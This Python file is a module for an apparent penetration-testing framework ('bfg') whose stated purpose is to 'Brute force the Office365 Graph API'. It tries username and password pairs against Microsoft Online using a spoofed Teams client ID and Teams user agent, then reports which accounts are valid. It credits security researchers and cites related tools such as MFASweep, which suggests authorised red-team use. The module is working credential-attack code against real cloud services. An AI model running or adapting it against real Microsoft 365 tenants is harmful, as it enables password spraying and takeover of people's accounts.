import re
import inspect
from copy import copy
from bfg.data import loadAzureSSOSoap
from bfg.args import http as http_args, argument
from bfg.shortcuts.http import HTTPModule, handleUA
from bfg.shortcuts.azure import *
from bfg.shortcuts.azure import request_profiles as RP
from argparse import BooleanOptionalAction
from requests.exceptions import ConnectionError

#MSONLINE_URL    = 'https://login.microsoftonline.com'
#O365_URL        = 'https://outlook.office365.com'

DEFAULT_RESOURCE_URL = 'https://graph.microsoft.com'

# Teams Client
DEFAULT_CLIENT_ID    = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'

# Teams User Agent
DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit' \
        '/537.36 (KHTML, like Gecko) Teams/1.2.00.34161 Chrome/66.0' \
        '.3359.181 Electron/3.1.13 Safari/537.36'

MSOL_DEFAULTS = RP.MicrosoftOnline()

def url():

    return http_args.url(
        name_or_flags=('--url',),
        required=False,
        default=MSOL_DEFAULTS.url,
        help='Microsoft Online URL to target. Default: %(default)s')

@argument
def path(name_or_flags=('--path',),
        default=MSOL_DEFAULTS.path,
        required=False,
        help='URL path that will be targeted during authentication.'):
    pass

@argument
def clientID(name_or_flags=('--client-id',),
        default=DEFAULT_CLIENT_ID,
        help='Client ID (UUID) to use. EXPERIMENTAL: Supply RANDOM to '
            'select a random value. Default: %(default)s'):
    pass

@argument
def resourceURL(name_or_flags=('--resource-url',),
        default=DEFAULT_RESOURCE_URL,
        help='Resource URL to use. EXPERIMENTAL: Supply RANDOM to '
            'select a random value. Default: %(default)s'):
    pass

@argument
def mfaChecks(name_or_flags=('--mfa-checks',),
        default=True,
        action=BooleanOptionalAction,
        help='Perform MFA checks on recovered credentials.'):
    pass

def user_agent():

    return http_args.url(
        name_or_flags=('--user-agent',),
        required=False,
        default=DEFAULT_UA,
        help='User-Agent header value. Defaults to Teams: %(default)s')

class Module(HTTPModule):

    brief_description = 'Office365 Graph API'

    description = 'Brute force the Office365 Graph API.'

    args = [url(), path(), user_agent()] + \
            http_args.getDefaults(
                'url', 'user_agent',
                invert=True) + \
            [clientID(), resourceURL(), mfaChecks()]

    contributors = [
            dict(
                name='Michael Allen [Researcher]',
                additional=dict(
                    company='Black Hills Information Security')),
            dict(
                name='Justin Angel [Module Creator]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@ImposterKeanu',
                    github='https://github.com/arch4ngel')),
            dict(
                name='Steve Borosh [Researcher]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@rvrsh3ll')),
            dict(
                name='Beau Bullock [Researcher]',
                additional=dict(
                    company='Black Hills Information Security',
                    twitter='@dafthack',
                    github='https://github.com/dafthack/')),
            dict(
                name='Corey Ham [Researcher]',
                additional=dict(
                    company='Black Hills Information Security')),
        ]

    references = [
            'Gerenios - Client IDs - https://github.com/Gerenios/' \
                'AADInternals/blob/master/AccessToken_utils.ps1#L11',
            'rvrsh3ll - Obscure error handling - https://github.com/' \
                'rvrsh3ll/aad-sso-enum-brute-spray',
            'Dafthack - MFASweep - https://github.com/dafthack/MFASweep'
        ]

    def __post_init__(self, client_id, resource_url,
            path, mfa_checks, *args, **kwargs):

        self.path = path
        self.client_id = client_id
        self.resource_url = resource_url
        self.headers['Accept'] = 'application/json'
        self.mfa_checks = mfa_checks

    @handleUA 
    def __call__(self, username, password, *args, **kwargs):
        '''Proxy the call request up to the Session object to perform
        authentication.
        '''

        request_profile = RP.MicrosoftOnline(
            url=self.url, path=self.path, headers=self.headers,
            proxies=self.proxies, verify_ssl=self.verify_ssl,
            allow_redirects=self.allow_redirects,
            resource_url=self.resource_url,
            client_id=self.client_id)

        try:

            outcome, valid_account, events = \
                request_profile.authenticate(username, password)

            # =========================
            # PERFORM MFA ACCESS CHECKS
            # =========================

            #if outcome == 1:

        except ConnectionError as e:

            return dict(
                outcome=-1,
                username=username,
                password=password,
                events=['Connection timed out'])

        events = events if events else []

        return dict(outcome=outcome,
                username=username,
                password=password,
                actionable=valid_account,
                events=events)



